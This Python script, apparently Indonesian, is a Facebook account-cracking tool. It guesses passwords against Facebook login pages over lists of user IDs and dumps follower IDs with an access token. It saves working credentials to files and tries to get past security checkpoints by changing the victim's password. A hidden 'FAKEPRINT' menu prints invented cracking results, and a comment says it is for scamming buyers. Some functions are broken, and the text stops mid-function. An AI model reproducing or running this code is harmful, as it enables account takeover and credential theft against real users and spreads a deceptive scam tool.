#python2-utf-8
#Script By Mr.Risky
#GITHUB.COM/DUMAI-991
#WA.ME/6283143565470
#TAG : #MR.RISKY #DAPUNTA #ANGGA #YAYAN #wansgang980
##############################################################################
#WARNA-PYTHON
q="\033[00m"
h2="\033[40m"
b2="\033[44m"
c2="\033[46m"
i2="\033[42m"
u2="\033[45m"
m2="\033[41m"
p2="\033[47m"
k2="\033[43m"
b='\033[0;94m'
i='\033[0;92m'
c='\033[0;96m'
m='\033[0;91m'
u='\033[0;95m'
k='\033[0;93m'
p='\033[0;97m'
h='\033[0;90m'
#IMPORT
import itertools, threading, os, requests, bs4, sys, os, subprocess, random, time, re, json
from concurrent.futures import ThreadPoolExecutor as YayanGanteng
from datetime import datetime
from time import sleep
from requests import Session
from sys import exit as keluar
from time import sleep as waktu
from random import random as acak
from random import choice as pilih
from sys import stdout
from os import system
import requests,mechanize,bs4,sys,os,subprocess,uuid,random,time,re,base64,concurrent.futures,json
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from datetime import date
from datetime import datetime
import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from setting import *
current = datetime.now()
r=requests.Session()
#BAHANTAMBAHAN
if os.path.exists(".useragent"):
        if os.path.getsize(".useragent") != 0:
                useragent=open(".useragent").read().strip()
#TANGGAL_EXPIRED
ok = []
cp = []
ttl =[]
durasi = str(datetime.now().strftime("%d-%m-%Y"))
tahun = current.year
bulan = current.month
hari = current.day
#WARNA_COPY_Right
#p = "\x1b[0;37m" # putih
p = "\x1b[0;33m" # putih
m = "\x1b[0;31m" # merah
h = "\x1b[0;32m" # hijau
k = "\033[0;36m" # kuning
b = "\x1b[0;34m" # biru
u = "\x1b[0;35m" # ungu
o = "\033[0;32m" # biru muda
bulat=(k+"["+p+"•"+k+"] "+p)   #   [•]
war=(k+"["+p+"!"+k+"] "+p)  # [!]
inp=(k+"["+p+"?"+k+"] "+p) # [?]
bulat2=(k+"["+p+"••"+k+"] "+p)   # [••]
war2=(k+"["+p+"!!"+k+"] "+p)  # [!!]
inp2=(k+"["+p+"??"+k+"] "+p) # [??]
#p = "\x1b[0;37m" # putih
#m = "\x1b[0;31m" # merah
#h = "\x1b[0;32m" # hijau
#k = "\x1b[0;32m" # kuning
#b = "\x1b[0;34m" # biru
#u = "\x1b[0;35m" # ungu
#o = "\x1b[0;36m" # biru muda
try:
	exp = requests.get("https://pastebin.com/raw/SNHmCTDF").text.strip() #Jangan DiEdit Kpnetod
	ser = requests.get("https://pastebin.com/raw/exzCY7sM").text.strip() #Jangan DiEdit Kpnetod
#	exp = ("15-07-2021")
	if durasi >= exp:
#		print (('\n').join([war+'Script Expired\n'+war+'HUB : 6283143565470\n'+war+'FB : https://m.facebook.com/llovexnxx']))
		logo_exp()
		sys.exit()
	try:
		if ser in ["MR.RISKY","DUMAI-991"]:
			print (war+"Server Saat Ini Aktif"),;time.sleep(1)
		else:
			logo_mt()
			print (war+"Server DiGunakan : "+i+ser)
			print (war+"Server Saat Ini Sedang Maintenance")
			print (bulat+"Silah Coba Berapa Saat.. !!")
			exit()
	except (KeyError, IOError):
		print(war+"Masalah Tidak DiKetahui")
		exit()
except (KeyError, IOError):
	print(war+"Masalah Tidak DiKetahui")
	exit()
if ("linux" in sys.platform.lower()):

        N = "\033[0m"
        G = "\033[0m"
        O = "\033[0m"
        R = "\033[0m"
#        N = "\033[0m"
#        G = "\033[1;92m"
#        O = "\033[1;93m"
#        R = "\033[1;91m"
else:

        N = ""
        G = ""
        O = ""
        R = ""
##############################################################################
#			      !!!! WARNING !!!!				     #
# 1. Jika Terjadi Masalah Terhadap Script Mau Pun Folder Hp Kamu Rusak Kami- #
# -. Tidak Tanggu Jawab :(						     #
# 2. Jika Anda Mau Edit Script Engga Apa. Tapi Jangan DiUbah Bot_Facebooknya #
##############################################################################


def results(Dapunta,Krahkrah):
        if len(Dapunta) !=0:
                print(("[OK] : "+str(len(Dapunta))))
        if len(Krahkrah) !=0:
                print(("[CP] : "+str(len(Krahkrah))))
        if len(Dapunta) ==0 and len(Krahkrah) ==0:
                print("\n")
                print((k+"["+p+"!"+k+"]"+p+" No Result Found"))
def mbasic(em,pas,hosts):
	ua = open('ua_me.txt', 'r').read()
	r=requests.Session()
	r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	p=r.get("https://mbasic.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}

def f_fb(em,pas,hosts):
	ua = open('ua_me.txt', 'r').read()
	r=requests.Session()
	r.headers.update({"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	p=r.get("https://free.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://free.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://free.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}


def lang(cookies):
	f=False
	rr=bs4.BeautifulSoup(requests.get("https://mbasic.facebook.com/language.php",headers=hdcok(),cookies=cookies).text,"html.parser")
	for i in rr.find_all("a",href=True):
		if "id_ID" in i.get("href"):
			requests.get("https://mbasic.facebook.com/"+i.get("href"),cookies=cookies,headers=hdcok())
			b=requests.get("https://mbasic.facebook.com/profile.php",headers=hdcok(),cookies=cookies).text	
			if "apa yang anda pikirkan sekarang" in b.lower():
				f=True
	if f==True:
		return True
	else:
		exit("[!] Wrong Cookies")

def basecookie():
	if os.path.exists(".cok"):
		if os.path.getsize(".cok") !=0:
			return gets_dict_cookies(open('.cok').read().strip())
		else:logs()
	else:logs()

def hdcok():
	global host
	hosts=host
	r={"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]", "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
	return r

def gets_cookies(cookies):
	result=[]
	for i in enumerate(cookies.keys()):
		if i[0]==len(list(cookies.keys()))-1:result.append(i[1]+"="+cookies[i[1]])
		else:result.append(i[1]+"="+cookies[i[1]]+"; ")
	return "".join(result)

def gets_dict_cookies(cookies):
	result={}
	try:
		for i in cookies.split(";"):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
	except:
		for i in cookies.split("; "):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
def country():
    os.system("clear")
    banner()
    jalan(f"{c}Made By Dapunta{q}")
    print("\n%s[%s Choose Country %s]\n"%(k,p,k))
    print("%s[%s1%s] %sIndonesia"%(k,p,k,p))
    print("%s[%s2%s] %sBangladesh/India"%(k,p,k,p))
    print("%s[%s3%s] %sPakistan"%(k,p,k,p))
    print("%s[%s4%s] %sUSA"%(k,p,k,p))
    choose_country()
    
def choose_country():
    cc = input("\n%s[%s•%s] %sChoose : "%(k,p,k,p))
    if cc in[""]:
        print((k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct"))
    elif cc in["1","01"]:
        os.system("rm -rf .pass.txt")
        cou = "id"
        try:
            ctry = open('.pass.txt','w')
            ctry.write(cou)
            ctry.close()
            menu()
        except (KeyError, IOError):
            menu()
    elif cc in["2","02"]:
        os.system("rm -rf .pass.txt")
        cou = "bd"
        try:
            ctry = open('.pass.txt','w')
            ctry.write(cou)
            ctry.close()
            menu()
        except (KeyError, IOError):
            menu()
    elif cc in["3","03"]:
        os.system("rm -rf .pass.txt")
        cou = "pk"
        try:
            ctry = open('.pass.txt','w')
            ctry.write(cou)
            ctry.close()
            menu()
        except (KeyError, IOError):
            menu()
    elif cc in["4","04"]:
        os.system("rm -rf .pass.txt")
        cou = "us"
        try:
            ctry = open('.pass.txt','w')
            ctry.write(cou)
            ctry.close()
            menu()
        except (KeyError, IOError):
            menu()
    else:
        print((k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct"))

def bash(dum):
	os.system(dum)
def logo():
    banner()

def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.02)
def user_prem():
	print(war+"Silahkan Pilih Menu !!")
	print(k+'['+p+'1'+k+']'+p+'Password Tambahan v1')
	print(k+'['+p+'2'+k+']'+p+'Password Tambahan v2')
	print(k+'['+p+'3'+k+']'+p+'Dump From File')
	print(k+'['+p+'4'+k+']'+p+'Back')
	smp=input(inp+"Pilih : "+i)
	if smp=="":
		print(war+'Fail Not Found')
		time.sleep(1)
		user_prem()
	elif smp =="01" or smp =="1":
		pw_tambahan_v1()
	elif smp =="02" or smp =="2":
		pw_tambahan_v2()
	elif smp =="03" or smp =="3":
		pemisahxx()
	elif smp =="04" or smp =="4":
		menu()
	else:
		print(war+'Fail Not Found')
		time.sleep(1)
		user_prem()
	def pw_tambahan_v1():
		print(war+'Silahkan Pilih Password Tambahan !!')
		print(k+'['+p+'1'+k+']'+p+'Name123 + Name12345')
		print(k+'['+p+'2'+k+']'+p+'Name123 + Name12345 + Name1234')
		print(k+'['+p+'3'+k+']'+p+'indonesia + sayang + bajingan')
		print(k+'['+p+'4'+k+']'+p+'kontol + bangsat + lonte')
		print(k+'['+p+'5'+k+']'+p+'SEMUA PASSWORD ++')
		rf=input(inp+"Pilih : "+i)
		if rf == "":
			print(war+'Jangan Kosong !!')
			time.sleep(1)
			user_prem()
		elif rf =="01" or rf =="1":
			print(war+"Anda Menggunakan Semua Password !!")
		elif rf =="02" or rf =="2":
			print(war+"Anda Menggunakan Semua Password !!")
		elif rf =="03" or rf =="3":
			print(war+"Anda Menggunakan Semua Password !!")
		elif rf =="04" or rf =="4":
			print(war+"Anda Menggunakan Semua Password !!")
		elif rf =="05" or rf =="5":
			print(war+"Anda Menggunakan Semua Password !!")
		else:
			print(war+'Isi Dengan Benar')
			time.sleep(1)
			user_prem()
def menu():
    os.system("mkdir Hasil/")
    try:
        toket = open("login.txt","r").read()
        otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
        a = json.loads(otw.text)
        nama = a["name"]
        id = a["id"]
    except Exception as e:
        print((k+"["+p+"•"+k+"]"+p+" Error : %s"%e)),;time.sleep(1)
        logs()
    ip = requests.get("https://api.ipify.org").text
    country=requests.get("http://ip-api.com/json/").json()["country"]
    ngr = open('.pass.txt', 'r').read()
    if "id" in ngr:
        negara = "Indonesia"
    elif "bd" in ngr:
        negara = "Bangladesh/India"
    elif "pk" in ngr:
        negara = "Pakistan"
    elif "us" in ngr:
        negara = "USA"
    os.system("clear")
    banner()
    print((k+"\n["+p+"++"+k+"]"+p+" Your Name     : "+nama))
    print((k+"["+p+"++"+k+"]"+p+" Your ID       : "+id))
    print((k+"["+p+"++"+k+"]"+p+" Your IP       : "+ip))
    print((k+"["+p+"++"+k+"]"+p+" Country       : "+country))
    print((k+"["+p+"++"+k+"]"+p+" Premium       : "+i+"Yes/Trial-FREE"+p))
    print((k+"["+p+"++"+k+"]"+p+" Last Updated  : "+i+"20-07-2021"+p))
    print((k+"["+p+"++"+k+"]"+p+" You Join Date : "+i+durasi+p))
    print((k+"["+p+"••"+k+"]"+u+"==================================================="+c+"⟩⟩"))
    print((k+"["+p+"01"+k+"]"+p+" Crack ID From Public/Friend "+k+" [ "+i+"Already updated "+k+"]"))
    print((k+"["+p+"02"+k+"]"+p+" Crack ID From Followers"+k+" [ "+i+"Already updated "+k+"]"))
    print((k+"["+p+"03"+k+"]"+p+" Crack ID From FileList"+k+" [ "+m+"Not yet updated "+k+"]"))
    print((k+"["+p+"04"+k+"]"+p+" Checkpoint Detector"+k+" [ "+o+"Menu New "+k+"]"))
    print((k+"["+p+"05"+k+"]"+p+" Get Target Information"+k+" [ "+o+"Menu New "+k+"]"))
    print((k+"["+p+"06"+k+"]"+p+" Dump ID Massal "+k+"( "+p+"Rawan Checkpoint "+k+")"))
    print((k+"["+p+"07"+k+"]"+p+" Menu Premium "+k+"("+i+"Premium Only"+k+")"))
    print((k+"["+p+"08"+k+"]"+p+" View Crack Results"))
    print((k+"["+p+"09"+k+"]"+p+" Settings User Agent"))
    print((k+"["+p+"10"+k+"]"+p+" Report "+k+"("+i+"Laporkan"+k+")"))
    print((k+"["+p+"11"+k+"]"+p+" Donasi "+k+"("+i+"Please bro"+k+")"))
    print((k+"["+p+"00"+k+"]"+p+" Logout "+k+"("+m+"REMOVE TOKEN"+k+")"))
    choose_menu()
#+k+"[ "+m+"Not yet updated "+k+"]"))

def choose_menu():
	r=input(k+"\n["+p+"•"+k+"]"+p+" Choose : ")
	if r=="":
		print((k+"["+p+"!"+k+"]"+p+" Fill In The Correct"))
		menu()
	elif r=="1" or r=="01":
		publik()
	elif r=="2" or r=="02":
		follow()
	elif r=="3" or r=="03":
		print(bulat+"FILE UNTUK DIHACK YANG TERSEDIA -->"+k),;os.system("ls *.json")
		jalan(bulat+'Masukan Nama Filenya.. Contoh : Risky.json'+q)
		dumai = input(k+'['+p+'•'+k+']'+p+' Nama File : '+q)
		filecoba(dumai)
	elif r=="4" or r=="04":
		Login_user()
		exit()
	elif r=="5" or r=="05":
		get_info()
	elif r=="6" or r=="06":
#		exit(war+'Masik Percobaan :)')
		print(bulat+"Hasil Dump Masal DiSimpan Di: "+i+"MASAL.json")
		jalan(war+"Saat Dump Masal Akan Terjadi...")
		jalan(bulat+"1. Spam Dump, Text Spam")
		jalan(bulat+"2. Token Mudah Rusak")
		jalan(bulat+"3. Kasih Waktu 5 Detik")
		jalan(war+"Masukan Sebanyak-Banyaknya !!")
		jalan(war+"CTRL + Z Untuk Stop !!")
		pemisah()
	elif r=="7" or r=="07":
		user_prem()
	elif r=="8" or r=="08":
		ress()
	elif r=="9" or r=="09":
		os.system("rm -rf ua_me.txt")
		menu_user_agent()
	elif r=="10" or r=="10":
		report_wa()
	elif r=="11" or r=="11":
		jalan(war+"Guna Doanv Kaga Donasi :v")
		jalan(war+"Anda Akan DiAlih KeGithub Dumai-991 ( READMD.md )")
		time.sleep(1.75)
		os.system("xdg-open https://github.com/Dumai-991/Dumai-991/blob/main/README.md")
		time.sleep(1.75)
		menu()
	elif r=="FAKEPRINT":
		print(f"""
[•] Followers ID Target : 53726XXXX
[•] Name : Eliot Cuduco
[•] Total ID : 5000

[1] Api ( Fast )
[2] Mbasic ( Slow )

[•] Choose : 1

[•] Crack Started...
[•] Account [OK] Saved to : OK.txt
[•] Account [×] Saved to : CP.txt

{i} [OK] 100037259232339|siti123
 [OK] 100058400629614|ujang123{k}
 [×] 100028447006914|piyon123
 [×] 100025178990640|aila123
 [×] 100044328361757|mesy123
 [×] 100006960191111|ouss12345
 [×] 100014229344949|sasa12345
 [×] 100026905057587|puput12345
 [×] 100018776192587|shaila123
 [×] 100012728401403|nila12345
 [×] 100010124674535|rani12345
 [×] 100014458861212|mbahcemplung123
{i} [OK] 100019549012335|akbar12345{k}
 [×] 100020038388267|amir12345
 [×] 100012505441442|nuris123
 [×] 100038464481741|aram12345
 [×] 100055597927243|yuliana123
 [×] 100021522786578|raisa123
 [×] 100006512680343|dwi123
 [×] 100011104141390|alma12345
 [×] 100054324525507|yanti123
 [×] 100066751156637|adan123
 [×] 100016310497928|achmad123
 [×] 100023459116918|penduxs123
 [×] 100036042847438|aldo123
{i} [OK] 100004574927001|wandi123
 [OK] 100037100204160|nenih123{k}
 [×] 100023998988274|asepbr123
 [×] 100033654229416|chaca123
 [×] 100002470377268|naen12345
[Crack] 1522/3451 [OK : 3] [CP : 15]
 [×] 100005874422014|winda12345
 [×] 100007227756450|lilis123
 [×] 100023546973075|nayla123
 [×] 100056647249868|upik123
 [×] 100012132816945|hana123
 [×] 100013854549610|andini123
 [×] 100066746546299|rap123
 [×] 100011944244184|etoy12345
{i} [OK] 100038875597090|ningsih12345{k}
[Crack] 1522/3451 [OK : 5] [CP : 27]""")  ### Untuk Pelaris Sc :)

####---UNTUK SEBAGAI PENIPU---###
####---MASUKAN IDNYA :)---#######
	elif r=="0" or r=="00":
		try:
			jalan(k+"\n["+p+"•"+k+"]"+p+" Terima Kasih Telah Menggunakan Script Kami..")
			os.system("rm -rf login.txt")
			exit()
		except Exception as e:
			print((k+"["+p+"!"+k+"]"+p+" Error %s"%e))
	else:
		print((k+"["+p+"!"+k+"]"+p+" Wrong Input"))
		menu()	
def Masal(idx,lim):
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((k+"\n["+p+"!"+k+"]"+p+" Cookie/Token Invalid"))
		print(k+"["+p+"!"+k+"]"+p+" Cookie/Token Rusak")
		os.system("rm -rf login.txt")
		logs()
	try:
		r=requests.get("https://graph.facebook.com/"+idx+"/subscribers?limit="+lim+"&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = ("MASAL.json").replace(" ","_")
		ys = open(qq , "a+")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print((k+"["+p+"•"+k+"]"+p+" Total ID : %s"%(len(id))))
		kntl()
		jalan("[•] Silahkan Tunggu Selama 5 Detik")
		time.sleep(1.75)
		return Masal(idx,lim)
	except Exception as e:
		kntl()
		jalan(bulat+"Silahkan Tunggu Selama "+i+"5"+p+"DETIK")
		time.sleep(1.75)
		return Masal(idx,lim)

def Login_user():
        try:
                import requests
                import requests
                from bs4 import BeautifulSoup
                from concurrent.futures import ThreadPoolExecutor
                if os.path.exists("result") == False:
                        os.mkdir("result")
                if os.path.exists("result/cp.txt") == False:
                        open("result/cp.txt","a").close()
        except Exception as E:
       	        print ("ERROR : "+str(E))
        jalan(war+"Before Continue Do you want to use the Default Splitting Distance "+k+"["+p+" Y/n  "+k+"]")
        jalan(war+"Sebelum Lanjut Apakah Anda Mau Menggunakan Jarak Memisah Default "+k+"["+p+" Y/n "+k+"]")
        x=input(inp+"Select : ")
        if x in [""," "]:
                print(bulat+"Jangan Kosong Kentod")
                time.sleep(2)
                Login_user()
        elif x in ["n","N"]:
                kentodxx()
        elif x in ["Y","y"]:
                kentodx()
        else:
                print(war+"Masalah Tidak DiTemukan")
                time.sleep(2)
                Login_user()
def file():
        fail=input(inp+"List File : ")
        while fail in (""," "):
                print(war+"Jangan Kosong Kontol")
                fail=input(inp+"List File : ")
        if fail.lower() == "set":
                set_ua()
        if os.path.exists(fail) == False:
                print(war+"File {} Ini Tidak DiTemukan".format(fail))
        return open(fail).read().splitlines()

def set_ua():
        print("\nUser Agent Sekarang : "+open(".useragent").read().strip()+"\n" if os.path.exists(".useragent") else "")
        ua=input("Masukan User Agent Anda : ")
        while ua in (""," "):
                print("Kosong Mulu Kentod")
                ua=input("Masukan User Agent : ")
        open(".useragent","w").write(ua)
        print("\nSuksess Ganti User Agent" if os.path.exists(".useragent") else "\nGagal Ganti User Agnet")
        exit("Jalankan Toolsnya Lagi !!")

def kentodx():
        os.system("clear")
        ngetik(f"""
@ {k}Athour   : {c}ITSUKI AND RISKY
@ {k}Fcaebook : {c}m.facebook.com/llovexnxx
@ {k}Whatsapp : {c}wa.me/6283143565470
@ {k}Group FB : {c}Termux Indonesia
{i}________       _____              _____       _________
___  __ \_____ __  /______ _________  /______ ______  /
__  / / /_  _ \_  __/_  _ \_  ___/_  __/_  _ \_  __  /
_  /_/ / /  __// /_  /  __// /__  / /_  /  __// /_/ /
/_____/  \___/ \__/  \___/ \___/  \__/  \___/ \__,_/
{k}             ___________                     ______                ______
                 ___  ____/______ _____________ ___  /_ ______ ______ ___  /__
                 __  /_    _  __ `/_  ___/_  _ \__  __ \_  __ \_  __ \__  //_/
                 _  __/    / /_/ / / /__  /  __/_  /_/ // /_/ // /_/ /_  ,<
                 /_/       \__,_/  \___/  \___/ /_.___/ \____/ \____/ /_/|_|
{c}Gunakan {i}|{c} Sebagai Pemisah !!{p}
{c}Hasil {i}OK {c}Detetor Facebook DiSimpan Di : result/ok.txt
{c}Hasil {i}CP {c}Detetor Facebook DiSimpan Di : result/cp.txt{q}\n""")
        list_akun=file()
        if list_akun:
                select_method()
                print(c+"\nLogin DiMulai\nHasil Loginnya DiSimpan Direquest\n")
                with ThreadPoolExecutor(max_workers=2) as su:
                        for akun in list_akun:
                                akun=akun.split("|")
                                su.submit(eksekusi,akun[0],akun[1])
        else:
                exit(m+"Masalah Tidak DiTemukan !!")

def kentodxx():
        os.system("clear")
        ngetik(f"""
@ {k}Athour   : {c}ITSUKI AND RISKY
@ {k}Fcaebook : {c}m.facebook.com/llovexnxx
@ {k}Whatsapp : {c}wa.me/6283143565470
@ {k}Group FB : {c}Termux Indonesia
{i}________       _____              _____       _________
___  __ \_____ __  /______ _________  /______ ______  /
__  / / /_  _ \_  __/_  _ \_  ___/_  __/_  _ \_  __  /
_  /_/ / /  __// /_  /  __// /__  / /_  /  __// /_/ /
/_____/  \___/ \__/  \___/ \___/  \__/  \___/ \__,_/
{k}             ___________                     ______                ______
                 ___  ____/______ _____________ ___  /_ ______ ______ ___  /__
                 __  /_    _  __ `/_  ___/_  _ \__  __ \_  __ \_  __ \__  //_/
                 _  __/    / /_/ / / /__  /  __/_  /_/ // /_/ // /_/ /_  ,<
                 /_/       \__,_/  \___/  \___/ /_.___/ \____/ \____/ /_/|_|
{c}Gunakan {i}|{c} Sebagai Pemisah !!{p}
{c}Hasil {i}OK {c}Detetor Facebook DiSimpan Di : result/ok.txt
{c}Hasil {i}CP {c}Detetor Facebook DiSimpan Di : result/cp.txt{q}\n""")
        jalan(war+"Contoh Pemisah : Username|Password Atau Username • Password")
        pp=input(inp+"Pemisah : ")
        list_akun=file()
        if list_akun:
                select_method()
                print(c+"\nLogin DiMulai\nHasil Loginnya DiSimpan Direquest\n")
                with ThreadPoolExecutor(max_workers=2) as su:
                        for akun in list_akun:
                                akun=akun.split(pp)
                                su.submit(eksekusi,akun[0],akun[1])
        else:
                exit(m+"Masalah Tidak DiTemukan !!")

def select_method(show=True):
        global url
        if show:
                print("\n [ Pilih Method Login ]")
                print(p+"1."+k+"Free Facebook")
                print(p+"2."+k+"Mbasic Facebook\n")
        select=input(k+"Method : "+i)
        while select in (""," "):
                print(m+"Kosong Mulu Ajg")
                select=input(k+"Method : ")
        if select == "1":
                url=url
        elif select == "2":
                url=url.replace("free","mbasic")
        else:
                print(m+"Masalah Tidak DiTemukan")
                select_method(False)

def eksekusi(username,password):
        useragent="Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36"
        try:
                respons=login_ris(username,password)
        except (requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                eksekusi(username,password)
        session=respons[0]
        if "c_user" in session.cookies.get_dict():
                print(q+"=============="+u+">>"+i+" Login Success "+u+"<<"+q+"============")
                print(c+"⟩⟩"+i+" {}|{}".format(username,password))
                print(q+"=========================================")
                open("result/ok.txt","a").write("{}|{}\n".format(username,password))
        elif "checkpoint" in session.cookies.get_dict():
                session.headers.update({"Host":re.search("(https://.*?\.facebook.com)",respons[1].url).group(1).split("//")[1],"referer":re.search("(https://.*?\.facebook.com)",respons[1].url).group(1)+"/checkpoint/"})
                respon=tahap1(session,parser(respons[1].text))
                if respon == "new password":
                        print(q+"===="+u+">>"+p+" Successfully Change Password "+u+"<<"+q+"===")
                        print(c+"⟩⟩"+i+" {}|{}".format(username,newpass))
                        print(q+"=========================================")
                        open("result/newpass.txt","a").write("{}|{}\n".format(username,newpass))
                elif respon == "no change password":
                        print(q+"====="+u+">>"+i+" Failed to Change Password "+u+"<<"+q+"=====")
                        print(c+"⟩⟩"+i+" {}|{}".format(username,password))
                        print(q+"=========================================")
                        open("result/no_change.txt","a").write("{}|{}\n".format(username,password))
                else:
                        print(q+"============="+u+">>"+k+" ChackPoints "+u+"<<"+q+"===========")
                        print(c+"⟩⟩ {}{}|{}".format(p,username,password))
                        print(q+"=========================================")
                        if username not in open("result/cp.txt").read():
                                open("result/cp.txt","a").write("{}|{}\n".format(username,password))
        else:
                print(q+"============"+u+">>"+m+" Login Failed "+u+"<<"+q+"===========")
                print(c+"⟩⟩"+m+" {}|{}".format(username,password))
                print(q+"=========================================")

def login_ris(username,password,**kwargs):
        session=requests.session()
        parsing=parser(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text)
        kwargs=get_data(parsing,"sign_up")
        kwargs.update({"email":username,"pass":password})
        if '_fb_noscript' in kwargs:
                del kwargs['_fb_noscript']
        session.headers.update({"Host":url.split("//")[1],"cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":useragent,"content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","referer":url+"/login/?next&ref=dbl&fl&refid=8","origin":url})
        respon=session.post(url+get_action(parsing),data=kwargs)
        return session,respon

def tahap1(session,parsing):
        kwargs=get_data(parsing,"submit[logout-button-with-confirm]")
        if "submit[Yes]" in kwargs:
                del kwargs["submit[No]"]
                try:
                        respon=session.post(session.headers["referer"].split("/checkpoint/")[0]+get_action(parsing),data=kwargs).text
                except requests.exceptions.TooManyRedirects:
                        respon="kontol"
                if "password_new" in respon or "buat kata sandi baru" in respon.lower():
                        return tahap2(session,parser(respon))
                if "c_user" in session.cookies.get_dict():
                        return "no change password"

def tahap2(session,parsing):
        kwargs=get_data(parsing,"submit[logout-button-with-confirm]")
        kwargs.update({"password_new":newpass})
        respons=session.post(session.headers["referer"].split("/checkpoint/")[0]+get_action(parsing),data=kwargs,allow_redirects=False)
        if "c_user" in respons.cookies.get_dict():
                return "new password"

def get_data(parsing,kecuali,**kwargs):
        for lnput in parsing.find_all("input",{"name":True,"value":True}):
                if kecuali in lnput["name"]: continue
                else: kwargs.update({lnput["name"]:lnput["value"]})
        return kwargs

def get_action(parsing):
        return parsing.find("form",{"method":"post"})["action"]

def parser(html):
        return BeautifulSoup(html,"html.parser")

def ngetik(kata,jum=0.002):
        for x in kata + "\n":
                sys.stdout.write(x)
                sys.stdout.flush()
                sleep(jum)
def report_wa():
	url_wa = requests.get("https://raw.githubusercontent.com/Dumai-991/App-Dumai991/main/no.txt").text.strip()
#	jalan(war+"Silahkan Isi Bio Data Ini Untuk Lajut/Report"),;time.sleep(1)
#	nik = input(inp+"Name       : "+i)
#	rpt = input(inp+"Problem    : "+i)
#	srn = input(inp+"Suggestion : "+i)
#	data_rpt = ("Nama : "+nik+"  Masalah : "+rpt+"  Saran : "+srn+"To "+url_wa)
#	jalan(war+data_rpt)
	api_wa = ("https://wa.me/"+url_wa)
	os.system("am start "+api_wa)
def Get_Ua():
	menu_user_agent()

def menu_user_agent():
	try:
		toket=open("ua_me.txt","r").read()
	except IOError:
		os.system("rm -rf ua_me.txt")
		os.system("clear")
